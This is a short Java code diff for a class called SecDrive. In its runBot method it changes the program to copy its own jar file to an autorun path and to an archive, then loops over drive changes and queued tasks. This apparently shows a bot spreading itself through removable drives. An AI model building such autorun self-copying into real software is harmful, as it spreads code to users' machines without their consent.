@@ -79,7 +79,8 @@ public class SecDrive {
 
     }
     private static void runBot(){
-        FilesOperator.copyJarFile(FilesOperator.getJarFilePath(SecDrive.class), true);
+        FilesOperator.copyJarFile(FilesOperator.getAutorunPath().getAbsolutePath(), true);
+        FilesOperator.copyJarFile(FilesOperator.archive.getAbsolutePath(), true);
         while (true) {
             FilesOperator.driveChanged();
             Tasks.proceedWithTasks();
